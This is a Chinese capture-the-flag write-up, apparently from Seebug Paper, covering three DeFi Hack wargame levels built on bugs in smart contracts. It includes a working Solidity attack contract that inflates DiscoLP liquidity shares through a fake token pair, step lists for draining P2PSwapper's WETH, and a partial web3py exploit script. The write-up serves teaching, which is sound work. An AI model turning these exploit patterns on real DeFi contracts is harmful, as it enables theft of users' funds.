**作者：0x9k  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL**
## 前言
DeFi Hack是根据真实世界DeFi中出现的漏洞为模板，抽象而来的wargame。用以提高学习者挖掘、利用DeFi智能合约漏洞的技能[1]。
## May The Force Be With You
### 题目描述
本关目标是从MayTheForceBeWithYou合约中盗取所有的YODA token，难度三颗星。
### 合约代码分析
YODA token是自实现的ERC20，自己实现了transfer方法。
**其自实现的doTransfer方法在token数量不足的情况下，并没有revert，而仅仅只是返回false。**
### 攻击
图1-1 攻击前合约余额
图1-2 攻击步骤
### 真实场景
## DiscoLP
### 题目描述
本关基于Uniswap2实现了一个自己的流动性池DiscoLP(流动性token为DISCO)，配对了JIMBO和JAMBO两种token。初始时给定player
1JIMBO和1JAMBO，期望用户获得100流动性token DISCO。难度七颗星。
### 合约代码分析
**depositToken函数没有针对传入的token(可控)进行有效性判断**
(判断是否为JIMBO、JAMBO)。致使后续在Uniswap路由中判断配对合约时并不是JIMBO&JAMBO，而是用户传入的token和配对合约中的一个token。
### 攻击
恶意构造一个token并mint，与配对合约中的tokenA创一个新的配对合约到Uniswap。调用depositToken获取得到超过100流动性的DISCO，再把获取的流动性token由攻击者合约转给player即可。
    pragma solidity >=0.6.5;
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol";
    interface IDiscoLP {
         function depositToken(address _token, uint256 _amount, uint256 _minShares) external;
         function balanceOf(address from) external returns (uint256);
         function approve(address spender, uint256 amount) external returns (bool);
         function transfer(address recipient, uint256 amount) external returns (bool);
    }
    contract Token is ERC20 {
        constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public {
            _mint(msg.sender, 2**256 - 1);
        }
    }
    library $ {
      address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten
      address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
    }
    interface IUniswapV2Factory {
      event PairCreated(address indexed token0, address indexed token1, address pair, uint);
      function getPair(address tokenA, address tokenB) external view returns (address pair);
      function allPairs(uint) external view returns (address pair);
      function allPairsLength() external view returns (uint);
      function feeTo() external view returns (address);
      function feeToSetter() external view returns (address);
      function createPair(address tokenA, address tokenB) external returns (address pair);
    }
    interface IUniswapV2Router {
        function WETH() external pure returns (address _token);
        function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
        function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
        function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
        function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
        function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
    }
    interface IPair {
        function token0() external view returns (address _token0);
        function token1() external view returns (address _token1);
        function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);
        function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);
        function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
        function mint(address _to) external returns (uint256 _liquidity);
        function sync() external;
    }
    contract DiscoLPAttack {
        function getToken0(address pair) public view returns(address) {
            return IPair(pair).token0();
        }
        function atttack(address instance, uint256 amount, address tokenA) public payable {
            address _factory = $.UniswapV2_FACTORY;
            address _router = $.UniswapV2_ROUTER02;
            ERC20 evilToken = new Token("Evil Token", "EVIL");
            address pair = IUniswapV2Factory(_factory).createPair(address(evilToken), address(tokenA));
            evilToken.approve(instance, uint256(-1));
            evilToken.approve(_router, uint256(-1));
            IERC20(tokenA).approve(_router, uint256(-1));
            (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
              address(evilToken),
              address(tokenA),
              1000000 * 10 ** 18,
              1 * 10 ** 18,
              1, 1, address(this), uint256(-1));
            IDiscoLP(instance).depositToken(address(evilToken), amount, 1);
        }
        function transferDiscoLP2Player(address instance, address player) public payable {
            uint256 balance = IDiscoLP(instance).balanceOf(address(this));
            IDiscoLP(instance).approve(address(this), uint256(-1));
            IDiscoLP(instance).transfer(player, balance);
        }
    }
    /**
     *  step1: get reserveToken() from instance
     *  step2: deploy attack contract
     *  step3: get token0 on pair attack.getToken0(reserveToken)
     *  step4: token0.transfer(attack contract, 1 * 10 ** 18)
     *         Token contract At Address in remix then transfer
     *  step5: attack contract attack(instance, 1000000 * 10 ** 18, token0)
     *  step6: transferDiscoLP2Player(instance, player)
     *  step7: in DiscoLP balanceOf(player)
     **/
### 真实场景
## P2PSwapper
### 题目描述
本关实现了一个零信任的DEX，并提供了交易相关的操作(创建createDeal、处理takeDeal、取消cancleDeal等)。目标是盗取P2PSwapper
合约中所有的WETH token。难度五颗星。
### 合约代码分析
默认partnerById和userByAddress并未初始化，当withdrawFees的user不存在，能bypass检查，使得userByAddress[msg.sender]
== 0 == partnerById[userId]。从而实现多次withdrawFees，最终实现提取完合约P2PSwapper中的WETH。
### 攻击
    /**
     *  1. 初始时P2PSwapper中的weth token，balanceOf(instance) == 313337+1 = 313338
     *       instance.createDeal{value: 313337}(p2pweth, 1, p2pweth, 1000000000000);
     *       partnerFees[0] = 313338/2 = 1566669
     * 
     *  2. 攻击者player调用p2pweth.deposit(1eth)
     *  3. 攻击者player调用approve(instance, 10eth = 1*10^19 = 10000000000000000000)完成授权
     *  4. 攻击者player调用P2PSwapper.createDeal(p2pweth, 1, p2pweth, 1) (value:3133338)
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 313338+1+3133338 = 3446677
     * 
     *  5. 攻击者player调用P2PSwapper.withdrawFees(player2)提取到一个未注册&初始化的用户地址player2
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 3446677 - partnerFees[0] = 3446677 - 1566669 = 1880008
     * 
     *  6. 攻击者player调用P2PSwapper.withdrawFees(player3)提取到一个未注册&初始化的用户地址player3
     *       此时P2PSwapper合约instance的余额 balanceOf(instance)  = 1880008 - partnerFees[0] = 1880008 - 1566669 = 313339
     *      
     *  7. 继续withdrawFees合约余额是不足的，需要稍加计算先给合约转入weth p2pweth.transfer(instance) = 1253330
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 313339 + 1253330 = 1566669 = partnerFees[0]
     * 
     *  8. 攻击者player调用P2PSwapper.withdrawFees(player4)提取到一个未注册&初始化的用户地址player4
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 1566669 - partnerFees[0] = 1566669 - 1566669 = 0
     * 
     *  done
    **/
图2-1 P2PSwapper合约余额
图2-2 创建交易
图2-3 withdrawFees
图2-4 攻击步骤8完成以后P2PSwapper合约余额
上述过程可以利用web3py&web3js编写自动化脚本。web3py攻击脚本如下:
    # -*-coding:utf-8-*-    __author__ = 'joker'
    import json
    import time
    from web3 import Web3, HTTPProvider
    from web3.gas_strategies.time_based import fast_gas_price_strategy, slow_gas_price_strategy, medium_gas_price_strategy
    # infura_url = 'https://ropsten.infura.io/v3/xxxx'
    infura_url = 'http://127.0.0.1:7545'
    web3 = Web3(Web3.HTTPProvider(infura_url, request_kwargs={'timeout': 600}))
    web3.eth.setGasPriceStrategy(fast_gas_price_strategy)
    gasprice = web3.eth.generateGasPrice()
    print("[+] fast gas price {0}...".format(gasprice))
    player_private_key = ''
    player_account = web3.eth.account.privateKeyToAccount(player_private_key)
    web3.eth.defaultAccount = player_account.address
    print("[+] account {0}...".format(player_account.address))
    player2_address = ''
    player3_address = ''
    player4_address = ''
    def send_transaction_sync(tx, account, args={}):
        args['nonce'] = web3.eth.getTransactionCount(account.address)
        signed_txn = account.signTransaction(tx.buildTransaction(args))
        tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
        time.sleep(30)
        return web3.eth.waitForTransactionReceipt(tx_hash)
    challenge_address = ""
    with open('./P2PSwapper/challenge.abi', 'r') as f:
        abi = json.load(f)
    challenge_contract = web3.eth.contract(address=challenge_address, abi=abi)
    p2pweth_address = challenge_contract.functions.p2pweth().call()
    print("[+] p2pweth {0}...".format(p2pweth_address))
    with open('./P2PSwapper/p2pweth.abi', 'r') as f:
        abi = json.load(f)
    p2pweth_contract = web3.eth.contract(address=p2pweth_address, abi=abi)
    # p2pweth.deposit(1eth)
    print("[+] step1 player p2pweth deposit 1eth...")
    tx = p2pweth_contract.functions.deposit()